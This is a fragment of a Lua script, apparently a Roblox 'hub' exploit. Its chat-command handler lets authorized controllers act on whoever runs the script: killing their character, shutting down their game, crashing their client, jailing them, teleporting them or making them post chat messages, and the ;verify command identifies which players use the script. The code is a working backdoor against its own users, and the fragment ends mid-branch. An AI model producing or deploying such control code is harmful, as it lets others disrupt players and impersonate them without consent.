local function HandleCommand(plr, msg)
    if not isAuthorized(plr.Name) then return end
    local args = msg:split(" ")
    local cmd = args[1]:lower()
    if cmd == ";verify" then
        SendChat("manga hub aqui.")
        scriptUsers[player.UserId] = true
    elseif cmd == ";bring" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                ForceJump(targetPlayer)
                wait(0.2)
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local targetPos = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = targetPos
                    end
                end
            end
        end
    elseif cmd == ";bringall" then
        BringAll(plr)
    elseif cmd == ";kill" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    player.Character.Humanoid.Health = 0
                end
            end
        end
    elseif cmd == ";killall" then
        KillAll()
    elseif cmd == ";kick" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                game:Shutdown()
            end
        end
    elseif cmd == ";crash" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                CrashClient()
            end
        end
    elseif cmd == ";jail" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                CreateJail(targetPlayer, plr)
            end
        end
    elseif cmd == ";unjail" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                RemoveJail(targetPlayer)
            end
        end
    elseif cmd == ";say" then
        if #args < 3 then return end
        local targetName = args[2]
        local targetResult = FindPlayer(targetName)
        local targets = GetTargetPlayers(targetResult, plr)
        for _, targetPlayer in pairs(targets) do
            if targetPlayer == player then
                local message = table.concat(args, " ", 3)
                SendChat(message)
            end
        end
    elseif cmd == ";spectate" or cmd == ";spec" then
        if #args < 2 then return end
        local targetName = table.concat(args, " ", 2)
        if targetName == "all" then
            UnspectateAll()
            return
        end
        local targetResult = FindPlayer(targetName)
        if targetResult and targetResult ~= "all" then
            Spectate(targetResult, plr)
        end
    elseif cmd == ";unspectate" then
        if #args >= 2 and table.concat(args, " ", 2):lower() == "all" then
            UnspectateAll()
        else
            if spectating[plr.UserId] then
                spectating[plr.UserId] = nil
                workspace.CurrentCamera.CameraSubject = plr.Character and plr.Character:FindFirstChild("Humanoid") or plr.Character
            end
        end
    elseif cmd == ";siga" then
        if #args < 2 then return end
        local targetName = args[2]
        local targetResult = FindPlayer(targetName)
        if not targetResult or targetResult == "all" then return end
        if #args >= 3 then
            local followerName = table.concat(args, " ", 3)
            local followerResult = FindPlayer(followerName)
            if followerResult and followerResult ~= "all" then
                if followerResult == player then
                    StartFollow(followerResult, targetResult)
                end
            elseif followerName:lower() == "all" then
